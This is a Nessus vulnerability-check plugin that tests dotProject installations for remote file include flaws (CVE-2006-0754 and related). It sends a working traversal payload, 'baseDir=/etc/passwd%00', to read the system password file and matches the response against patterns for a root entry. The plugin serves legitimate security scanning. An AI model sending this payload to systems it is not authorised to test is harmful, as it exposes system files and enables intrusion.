#
# (C) Tenable Network Security, Inc.
#



include("compat.inc");

if (description) {
  script_id(20925);
  script_version("$Revision: 1.12 $");

  script_cve_id("CVE-2006-0754", "CVE-2006-0755", "CVE-2006-4234");
  script_bugtraq_id(16648, 19547);
  script_xref(name:"OSVDB", value:"23210");
  script_xref(name:"OSVDB", value:"23211");
  script_xref(name:"OSVDB", value:"23212");
  script_xref(name:"OSVDB", value:"23213");
  script_xref(name:"OSVDB", value:"23214");
  script_xref(name:"OSVDB", value:"23215");
  script_xref(name:"OSVDB", value:"23216");
  script_xref(name:"OSVDB", value:"23217");
  script_xref(name:"OSVDB", value:"23218");
  script_xref(name:"OSVDB", value:"23219");
  script_xref(name:"OSVDB", value:"29478");

  script_name(english:"dotProject Multiple Scripts Remote File Inclusion");
  script_summary(english:"Checks for remote file include vulnerabilities in dotProject");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP application that is affected by
multiple remote file include vulnerabilities." );
 script_set_attribute(attribute:"description", value:
"The remote host is running dotProject, a web-based, open-source,
project management application written in PHP. 

The installed version of dotProject fails to sanitize input to various
parameters and scripts before using it to include PHP code.  Provided
PHP's 'register_globals' setting is enabled, an unauthenticated
attacker may be able to exploit these flaws to view arbitrary files on
the remote host or to execute arbitrary PHP code, possibly taken from
third-party hosts." );
 script_set_attribute(attribute:"see_also", value:"http://www.securityfocus.com/archive/1/424957/30/0/threaded" );
 script_set_attribute(attribute:"see_also", value:"http://milw0rm.com/exploits/2191" );
 script_set_attribute(attribute:"see_also", value:"http://www.dotproject.net/vbulletin/showthread.php?t=4462" );
 script_set_attribute(attribute:"see_also", value:"http://www.securityfocus.com/archive/1/425285/100/0/threaded" );
 script_set_attribute(attribute:"solution", value:
"Disable PHP's 'register_globals' setting as per the application's
installation instructions." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P" );
script_end_attributes();


  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2006-2009 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");


port = get_http_port(default:80, embedded: 0);
if (!can_host_php(port:port)) exit(0);

# Loop through directories.
if (thorough_tests) dirs = list_uniq(make_list("/dotproject", "/dotProject", cgi_dirs()));
else dirs = make_list(cgi_dirs());

foreach dir (dirs) {
  # Try to exploit one of the flaws to read /etc/passwd.
  file = "/etc/passwd";
  r = http_send_recv3(method: "GET", port: port, 
    item:string( dir, "/includes/db_adodb.php?", "baseDir=", file, "%00" ));
  if (isnull(r)) exit(0);

  # There's a problem if...
  if (
    # there's an entry for root or...
    egrep(pattern:"root:.*:0:[01]:", string:r[2]) ||
    # we get an error saying "failed to open stream".
    egrep(pattern:"main\(/etc/passwd\\0/lib/adodb/adodb\.inc\.php.+ failed to open stream", string:r[2]) ||
    # we get an error claiming the file doesn't exist or...
    egrep(pattern:"main\(/etc/passwd\).*: failed to open stream: No such file or directory", string:r[2]) ||
    # we get an error about open_basedir restriction.
    egrep(pattern:"main.+ open_basedir restriction in effect. File\(/etc/passwd", string:r[2])
  ) {
    if (egrep(string:r[2], pattern:"root:.*:0:[01]:")) 
      contents = r[2] - strstr(r[2], "<br");

    if (isnull(contents) || !report_verbosity) security_hole(port);
    else {
      report = string(
        "\n",
        "Here are the contents of the file '", file, "' that\n",
        "Nessus was able to read from the remote host :\n",
        "\n",
        contents
      );
      security_hole(port:port, extra:report);
    }

    exit(0);
  }
}
